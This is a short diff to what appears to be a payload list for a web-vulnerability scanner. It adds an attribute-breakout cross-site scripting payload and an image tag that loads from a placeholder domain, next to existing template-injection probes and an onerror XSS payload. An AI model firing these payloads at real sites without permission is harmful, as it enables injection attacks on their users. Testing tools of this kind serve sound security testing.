@@ -18,4 +18,6 @@ http://
 ${{<%[%'"{{%\
 <s>CANARY_STRINGZZ
 "><img src=CANARY_STRINGZZ onerror=alert(document.domain)>
+" tabindex=1 onfocus=alert(1) x="
+<img/src=http://{domain}>
 {{8*8}}[[5*5]]${7*4}
